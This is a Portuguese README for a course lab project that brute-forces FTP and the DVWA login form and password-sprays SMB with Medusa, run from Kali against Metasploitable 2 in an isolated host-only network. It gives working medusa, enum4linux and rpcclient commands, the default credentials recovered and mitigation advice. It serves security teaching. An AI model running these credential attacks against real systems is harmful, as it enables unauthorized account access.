🛡️ Ataques de Força Bruta com Medusa em Ambiente Controlado
Projeto prático desenvolvido para o desafio de código da Digital Innovation One (DIO), com o objetivo de simular ataques de força bruta (FTP, formulário web DVWA e SMB) em um ambiente de laboratório totalmente isolado, utilizando Kali Linux e a ferramenta Medusa, contra os ambientes intencionalmente vulneráveis Metasploitable 2 e DVWA.
> ⚠️ **Aviso de uso ético (Disclaimer)**
> Todo o conteúdo deste repositório tem finalidade **exclusivamente educacional**. Os testes foram realizados em uma **rede interna isolada (host-only)**, sem qualquer conexão com a internet ou com sistemas de terceiros. **Nunca execute técnicas de força bruta contra sistemas que você não possua ou para os quais não tenha autorização explícita por escrito.** O uso indevido dessas técnicas pode configurar crime previsto na Lei nº 12.737/2012 (Lei Carolina Dieckmann) e na Lei nº 14.155/2021, além de legislações equivalentes em outros países.
---
📑 Sumário
Objetivo
Arquitetura do Laboratório
Configuração do Ambiente
Reconhecimento Inicial
Cenário 1 — Força Bruta em FTP
Cenário 2 — Automação de Ataque em Formulário Web (DVWA)
Cenário 3 — Password Spraying em SMB
Wordlists Utilizadas
Resultados e Validação de Acessos
Recomendações de Mitigação
Aprendizados e Reflexões
Estrutura do Repositório
Referências
---
🎯 Objetivo
Compreender na prática como funcionam ataques de força bruta (brute force) e de pulverização de senhas (password spraying) contra serviços comuns em redes corporativas (FTP, aplicações web e SMB), utilizando o Medusa como ferramenta principal, e documentar:
os comandos utilizados em cada cenário;
as wordlists criadas para os testes;
as evidências de acesso obtido;
as medidas de mitigação recomendadas para cada vulnerabilidade explorada.
---
🧱 Arquitetura do Laboratório
Máquina	Função	Sistema	IP (exemplo)
Kali Linux	Máquina atacante	Kali Linux 2024.x	`192.168.56.10`
Metasploitable 2	Alvo vulnerável (FTP, SMB, DVWA)	Ubuntu 8.04 (modificado)	`192.168.56.20`
Rede: VirtualBox Host-Only Adapter (`vboxnet0`), garantindo que o tráfego de ataque fique restrito à rede interna do laboratório, sem saída para a internet ou para a rede do host.
```
┌─────────────────────┐        Rede Host-Only        ┌──────────────────────────┐
│     Kali Linux       │ <───── 192.168.56.0/24 ────> │     Metasploitable 2     │
│  192.168.56.10        │                              │  192.168.56.20            │
│  (Medusa, Nmap,        │                              │  FTP (vsftpd 2.3.4)       │
│   enum4linux)          │                              │  SMB (Samba 3.x)          │
│                         │                              │  DVWA (Apache/PHP/MySQL)  │
└─────────────────────┘                              └──────────────────────────┘
```
---
⚙️ Configuração do Ambiente
1. VirtualBox — Rede Host-Only
Arquivo > Configurações de Rede do Host (File > Host Network Manager) → criar um adaptador (ex.: `vboxnet0`), com DHCP desabilitado para controle manual dos IPs.
Em cada VM: Configurações > Rede > Adaptador 1 → Habilitado, conectado a Adaptador Host-Only, selecionando `vboxnet0`.
Atribuir IPs estáticos dentro da mesma sub-rede, por exemplo:
Kali Linux: `192.168.56.10/24`
Metasploitable 2: `192.168.56.20/24`
2. Kali Linux
```bash
sudo apt update && sudo apt install -y medusa nmap enum4linux smbclient hydra
```
3. Metasploitable 2
Baixar a imagem oficial (SourceForge / repositório Rapid7) e importar no VirtualBox.
Login padrão: `msfadmin` / `msfadmin`.
Validar que os serviços FTP (porta 21), SSH (22) e SMB (139/445) estão ativos:
```bash
sudo /etc/init.d/vsftpd status
sudo /etc/init.d/smbd status
```
4. DVWA (Damn Vulnerable Web Application)
O Metasploitable 2 já inclui o DVWA em `http://192.168.56.20/dvwa/`. Após o login inicial (`admin` / `password`), ir em DVWA Security e definir o nível como Low, para focar no exercício de força bruta sem interferência de outras proteções (CSRF token, captcha etc.) nesta primeira etapa. (Opcional: repetir o teste em nível Medium/High para comparar o efeito das mitigações.)
---
🔍 Reconhecimento Inicial
Antes de qualquer tentativa de força bruta, foi feito um levantamento de portas e serviços com Nmap:
```bash
nmap -sV -p21,22,80,139,445 192.168.56.20
```
Saída resumida esperada:
```
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1
80/tcp  open  http    Apache httpd 2.2.8
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  netbios-ssn Samba smbd 3.X
```
Um script de apoio para automatizar essa etapa está disponível em `scripts/lab_recon.sh`.
---
🔑 Cenário 1 — Força Bruta em FTP
Serviço: `vsftpd 2.3.4` (porta 21) — versão conhecida por vulnerabilidades, usada aqui apenas como alvo de treino de autenticação.
Comando Medusa
```bash
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M ftp \
       -t 4 \
       -f
```
Explicação dos parâmetros:
Parâmetro	Significado
`-h`	Host alvo
`-U`	Wordlist de usuários
`-P`	Wordlist de senhas
`-M ftp`	Módulo de ataque (FTP)
`-t 4`	4 threads paralelas
`-f`	Interrompe assim que encontrar a primeira credencial válida
Resultado obtido (exemplo)
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```
Validação do acesso
```bash
ftp 192.168.56.20
Name: msfadmin
Password: msfadmin
ftp> ls
```
Login confirmado com sucesso, validando a credencial encontrada pelo Medusa.
---
🌐 Cenário 2 — Automação de Ataque em Formulário Web (DVWA)
Alvo: formulário de login do DVWA (`http://192.168.56.20/dvwa/login.php`), nível de segurança Low.
Passo 1 — Capturar a estrutura da requisição
Com o Burp Suite, DevTools do navegador ou `curl -v`, identificamos os campos do formulário POST e o cookie de sessão necessário (`PHPSESSID`), além da mensagem de erro exibida em caso de falha (`Login failed`).
Passo 2 — Comando Medusa (módulo `web-form`)
```bash
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M web-form \
       -m FORM:"/dvwa/login.php" \
       -m DENY-SIGNAL:"Login failed" \
       -m FORM-DATA:"post?username=&password=&Login=Login" \
       -t 4
```
> 💡 **Observação:** o Medusa exige que o cookie de sessão (`PHPSESSID`) e o token `user_token` do DVWA sejam tratados manualmente — como o DVWA usa CSRF token no formulário de login, nesta etapa validei o ataque com o nível **Low** (sem token dinâmico), e documentei no repositório a limitação observada ao tentar o mesmo contra o nível **Medium/High**. Essa foi uma das principais lições práticas do cenário web: *"nem toda ferramenta de força bruta automatizada contorna sozinha proteções de CSRF/token — é preciso tratamento de sessão adicional (ex.: scripts próprios ou Hydra com suporte a cookies dinâmicos)"*.
Alternativa documentada: script Python simples de automação
Como alternativa (e para reforçar o aprendizado), também documentei um pequeno script Python usando `requests` e `BeautifulSoup` para extrair o `user_token` dinâmico antes de cada tentativa — disponível em `scripts/dvwa_bruteforce.py`.
Resultado obtido (exemplo)
```
ACCOUNT FOUND: [web-form] Host: 192.168.56.20 User: admin Password: password [SUCCESS]
```
---
🧑‍💻 Cenário 3 — Password Spraying em SMB com Enumeração de Usuários
Diferente do brute force tradicional (muitas senhas por usuário), o password spraying testa poucas senhas comuns contra muitos usuários, reduzindo o risco de bloqueio de conta por tentativas excessivas — uma técnica muito usada contra ambientes corporativos reais.
Passo 1 — Enumeração de usuários via SMB
```bash
enum4linux -U 192.168.56.20
```
ou, alternativamente:
```bash
smbclient -L //192.168.56.20 -N
rpcclient -U "" -N 192.168.56.20 -c "enumdomusers"
```
Essas ferramentas retornam uma lista de contas válidas no sistema (ex.: `msfadmin`, `user`, `service`, `postgres`), que foi incorporada à wordlist `wordlists/usuarios.txt`.
Passo 2 — Password spraying com Medusa
```bash
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas_spray.txt \
       -M smbnt \
       -t 2 \
       -f
```
> Aqui, `wordlists/senhas_spray.txt` contém **poucas senhas muito comuns** (ex.: `123456`, `password`, `msfadmin`), simulando o comportamento real de um atacante que evita lockouts.
Resultado obtido (exemplo)
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```
Validação do acesso
```bash
smbclient //192.168.56.20/tmp -U msfadmin%msfadmin
```
---
📂 Wordlists Utilizadas
As wordlists usadas neste laboratório são propositalmente simples, refletindo o tipo de erro humano mais comum (senhas fracas, padrão ou reaproveitadas) — exatamente o que esses ataques exploram na prática:
`wordlists/usuarios.txt` — usuários comuns/padrão do Metasploitable 2 + nomes obtidos via enumeração SMB.
`wordlists/senhas.txt` — senhas fracas/comuns usadas nos cenários de FTP e DVWA.
`wordlists/senhas_spray.txt` — subconjunto reduzido de senhas muito comuns, usado especificamente no cenário de password spraying.
> Para cenários reais de auditoria (sempre com autorização), listas maiores como `rockyou.txt` (incluída no Kali em `/usr/share/wordlists/`) costumam ser utilizadas — aqui optei por listas enxutas para manter o foco didático e tempos de execução curtos.
---
✅ Resultados e Validação de Acessos
Cenário	Serviço	Usuário	Senha	Status	Validação
1	FTP	`msfadmin`	`msfadmin`	✅ Sucesso	Login manual via `ftp`
2	DVWA (web-form)	`admin`	`password`	✅ Sucesso	Login manual no navegador
3	SMB	`msfadmin`	`msfadmin`	✅ Sucesso	Login manual via `smbclient`
(Capturas de tela de cada etapa estão disponíveis na pasta `/images`.)
---
🛡️ Recomendações de Mitigação
Vulnerabilidade explorada	Recomendação de mitigação
Senhas fracas/padrão em FTP	Desabilitar contas padrão, aplicar política de senha forte (mínimo de caracteres, complexidade, rotação), preferir SFTP/FTPS com autenticação por chave em vez de FTP puro.
Ausência de limite de tentativas no login web (DVWA)	Implementar rate limiting, bloqueio temporário de conta após N tentativas falhas, CAPTCHA, autenticação multifator (MFA) e uso de tokens CSRF válidos e renovados a cada requisição.
Exposição de usuários via enumeração SMB (`enum4linux`/`rpcclient`)	Restringir sessões nulas (null sessions) no Samba (`restrict anonymous`), desabilitar compartilhamento de SMBv1, segmentar a rede e aplicar firewall entre hosts.
Password spraying	Política de senha com bloqueio progressivo (account lockout), monitoramento de tentativas de login com SIEM/IDS, MFA, e banimento de senhas presentes em listas conhecidas de vazamentos (ex.: Have I Been Pwned API).
Falta de monitoramento	Implementar logging centralizado e alertas para múltiplas tentativas de autenticação falhas em curto intervalo de tempo (ex.: Fail2Ban, SIEM).
---
🧠 Aprendizados e Reflexões
Ataques de força bruta são simples de executar, mas sua eficácia real depende quase inteiramente da higiene de senhas do ambiente-alvo — a maior parte das credenciais do Metasploitable 2 foi obtida por serem literalmente o nome de usuário repetido como senha.
O cenário web (DVWA) deixou claro que ferramentas de automação de força bruta não lidam sozinhas com proteções modernas (CSRF token, sessão dinâmica, CAPTCHA) — é necessário entender o fluxo da aplicação para adaptar o ataque, o que também evidencia o valor dessas proteções como mitigação.
A técnica de password spraying reforçou a importância de políticas de lockout inteligentes: um bloqueio após poucas tentativas por usuário é menos eficaz contra spraying do que um monitoramento baseado em volume de tentativas por IP/origem.
Trabalhar em uma rede host-only isolada foi essencial para garantir que todo o exercício ficasse contido, sem qualquer risco de impacto em sistemas reais.
---
🗂️ Estrutura do Repositório
```
.
├── README.md
├── wordlists/
│   ├── usuarios.txt
│   ├── senhas.txt
│   └── senhas_spray.txt
├── scripts/
│   ├── lab_recon.sh
│   └── dvwa_bruteforce.py
└── images/
    ├── 01-topologia-rede.png
    ├── 02-nmap-scan.png
    ├── 03-medusa-ftp.png
    ├── 04-dvwa-login.png
    └── 05-medusa-smb.png
```
---
📚 Referências
Kali Linux — Site Oficial
Medusa — Documentação Oficial
DVWA — Damn Vulnerable Web Application
Nmap — Manual Oficial
Metasploitable 2 — Rapid7
OWASP — Credential Stuffing & Brute Force Prevention
Slide da DIO: Criando um Ataque Brute Force de senhas com Medusa e Kali Linux
---
👤 Autor
Projeto desenvolvido como parte do desafio de código da Digital Innovation One (DIO), trilha de Cibersegurança.
> Sinta-se à vontade para abrir *issues* ou sugerir melhorias neste repositório — feedback é sempre bem-vindo! 🚀
